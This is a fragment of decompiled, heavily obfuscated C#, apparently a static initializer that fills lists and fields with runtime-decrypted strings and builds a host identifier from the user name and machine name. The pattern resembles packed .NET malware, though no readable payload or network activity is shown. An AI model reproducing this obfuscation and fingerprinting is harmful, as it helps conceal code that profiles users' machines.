			dAXyboFAql(getString_0(107412403)),
			dAXyboFAql(getString_0(107412370)),
			dAXyboFAql(getString_0(107412337)),
			dAXyboFAql(getString_0(107411808)),
			dAXyboFAql(getString_0(107411779)),
			dAXyboFAql(getString_0(107411702)),
			dAXyboFAql(getString_0(107411657)),
			dAXyboFAql(getString_0(107411648)),
			dAXyboFAql(getString_0(107411591)),
			dAXyboFAql(getString_0(107412022)),
			dAXyboFAql(getString_0(107412025)),
			dAXyboFAql(getString_0(107411948))
		};
		MUKeFWwqRbsUt = new List<string>
		{
			dAXyboFAql(getString_0(107411939)),
			dAXyboFAql(getString_0(107411858)),
			dAXyboFAql(getString_0(107411841)),
			dAXyboFAql(getString_0(107411248)),
			dAXyboFAql(getString_0(107411231)),
			dAXyboFAql(getString_0(107411166)),
			dAXyboFAql(getString_0(107411057)),
			dAXyboFAql(getString_0(107411508))
		};
		QxnFKMJGHHM = new List<string>
		{
			dAXyboFAql(getString_0(107411483)),
			dAXyboFAql(getString_0(107411450)),
			dAXyboFAql(getString_0(107411373)),
			dAXyboFAql(getString_0(107411356)),
			dAXyboFAql(getString_0(107411323)),
			dAXyboFAql(getString_0(107410730)),
			dAXyboFAql(getString_0(107410717)),
			dAXyboFAql(getString_0(107410684)),
			dAXyboFAql(getString_0(107410651)),
			dAXyboFAql(getString_0(107410618)),
			dAXyboFAql(getString_0(107410585)),
			dAXyboFAql(getString_0(107411032)),
			dAXyboFAql(getString_0(107410991)),
			dAXyboFAql(getString_0(107410982)),
			dAXyboFAql(getString_0(107410937)),
			dAXyboFAql(getString_0(107410872)),
			dAXyboFAql(getString_0(107410831)),
			dAXyboFAql(getString_0(107410798)),
			dAXyboFAql(getString_0(107410277)),
			dAXyboFAql(getString_0(107410236)),
			dAXyboFAql(getString_0(107410203)),
			dAXyboFAql(getString_0(107410130)),
			dAXyboFAql(getString_0(107410097)),
			dAXyboFAql(getString_0(107411483)),
			dAXyboFAql(getString_0(107410088)),
			dAXyboFAql(getString_0(107410047)),
			dAXyboFAql(getString_0(107410482)),
			dAXyboFAql(getString_0(107410449)),
			dAXyboFAql(getString_0(107410440)),
			dAXyboFAql(getString_0(107410399)),
			dAXyboFAql(getString_0(107410366)),
			dAXyboFAql(getString_0(107410293)),
			dAXyboFAql(getString_0(107409740)),
			dAXyboFAql(getString_0(107411450)),
			dAXyboFAql(getString_0(107409731)),
			dAXyboFAql(getString_0(107411373)),
			dAXyboFAql(getString_0(107409698)),
			dAXyboFAql(getString_0(107409665)),
			dAXyboFAql(getString_0(107409592)),
			dAXyboFAql(getString_0(107409559)),
			dAXyboFAql(getString_0(107409518)),
			dAXyboFAql(getString_0(107410021)),
			dAXyboFAql(getString_0(107409988)),
			dAXyboFAql(getString_0(107409955)),
			dAXyboFAql(getString_0(107409914)),
			dAXyboFAql(getString_0(107409841)),
			dAXyboFAql(getString_0(107409832))
		};
		tYFycaveyEZlTZa = new List<string>
		{
			dAXyboFAql(NcLuovKFaQKveac(getString_0(107409791))),
			dAXyboFAql(getString_0(107409198)),
			dAXyboFAql(getString_0(107409105)),
			dAXyboFAql(getString_0(107409008)),
			dAXyboFAql(getString_0(107409427)),
			dAXyboFAql(getString_0(107409330)),
			dAXyboFAql(getString_0(107408725)),
			dAXyboFAql(getString_0(107408628)),
			dAXyboFAql(getString_0(107408535)),
			dAXyboFAql(getString_0(107408950)),
			dAXyboFAql(getString_0(107408889)),
			dAXyboFAql(getString_0(107408760)),
			dAXyboFAql(getString_0(107408187)),
			dAXyboFAql(NcLuovKFaQKveac(getString_0(107409791)))
		};
		yaObxwDYeQoq = dAXyboFAql(getString_0(107408090));
		DZKPMstogvMqutY = new List<string>
		{
			dAXyboFAql(getString_0(107408457)),
			dAXyboFAql(getString_0(107408295)),
			dAXyboFAql(getString_0(107407589)),
			dAXyboFAql(getString_0(107407907)),
			dAXyboFAql(getString_0(107407201)),
			dAXyboFAql(getString_0(107407007))
		};
		jGCPbbWylwhkiZ = new List<string>
		{
			dAXyboFAql(getString_0(107407325)),
			dAXyboFAql(getString_0(107407264)),
			dAXyboFAql(getString_0(107406691))
		};
		aWvdmtYWLU = getString_0(107396267);
		DRlOGAWkgnPyhTM = getString_0(107396267);
		fpPKoegyFTl = new DateTime(2000, 1, 1);
		odkofmjGNehiR = new DateTime(2100, 1, 1);
		JxuqTkcAaBSWi = getString_0(107396810);
		LSeqdHjjsVhLqcK = getString_0(107389045);
		EgQwzOCvnHMPfG = getString_0(107396267);
		SmtRihlsiEMW = getString_0(107396267);
		HuXyLjhiTYuOC = getString_0(107396267);
		svEcVjBTCnuAYEoPH = getString_0(107396810);
		FLSEvrhuWfJ = getString_0(107396267);
		pXuFbktiBaug = getString_0(107396267);
		eiWezuyCGKD = new List<string>
		{
			getString_0(107395820),
			getString_0(107396046),
			getString_0(107395854),
			getString_0(107395415)
		};
		xhUXlAlyfax = getString_0(107396267);
		LglvkdAEDeokrPA = getString_0(107406630);
		gDLhAzrZSKssbSP = getString_0(107396267);
		TOzFyVZevgZt = getString_0(107396267);
		iMYZrEovwwqNE = getString_0(107396267);
		xNSqMIOLMLAwy = string.Empty;
		VMmbarXfpds = getString_0(107396267);
		MAIfUAvpaRAOicbA = getString_0(107396267);
		dOhNMoendime = getString_0(107396267);
		ZuONjNkcSQG = getString_0(107393401);
		BsEhNrYEPyIbuei = getString_0(107393401);
		BYECuHinFzglbhHW = getString_0(107396267);
		YIPXGAmIVTAgIi = getString_0(107396810);
		YmTiJprAuyeUnyd = getString_0(107396267);
		LRFgFKajMFF = getString_0(107396267);
		iTtbTuAkveiFQ = getString_0(107396267);
		ynsgvIeaItiOAP = getString_0(107406625);
		MeHrIQtFIeB = getString_0(107396267);
		cCTuunwfNioo = getString_0(107396267);
		CrIMGxZNxmnsF = getString_0(107406576);
		HazSUKRRBl = getString_0(107396267);
		oFPgjCRDHeJnCyn = getString_0(107396267);
		xoOIzmzChOZBJa = getString_0(107396267);
		lAoTEijSeOCrur = getString_0(107396267);
		JdCefxYFMIQXhE = getString_0(107406587);
		VbexJOEZOrg = getString_0(107396810);
		vKGebXPGqUoRq = getString_0(107396267);
		UmYbFPakVvjG = getString_0(107396267);
		OVsecWAEVkGcGjJDv = getString_0(107396267);
		KRkKkskNZSstTnnF = new string[0];
		lAmPIwcPEjNhXG = getString_0(107396267);
		jwIpebsbuTtJKU = true;
		baebLNYmOilG = getString_0(107396267);
		HHLzNKWftxhcT = false;
		nCFuCxDDXURK = false;
		ztMqipVfVlgMZOq = false;
		FozVogARTDEY = false;
		UvHPjcAlchtwE = getString_0(107406542);
		geeOWbkDyamU = false;
		hUQCboiKyWJxZi = false;
		yrqPvlUpuGZW = false;
		bLbMRmlIqKb = false;
		aDzhxFxDvB = true;
		AGuLAAdWUTO = getString_0(107406553) + Environment.UserName + getString_0(107406508) + Environment.MachineName + getString_0(107406487) + jJNOnNgWhS.cMSpVshzWXgKIq() + getString_0(107406482);
		TdgxQRgoFMw = new List<string>();
		iaHlLkaXwuio = new List<string>();
		nKPyjivwjXGlLxX = new List<string>();
	}
}
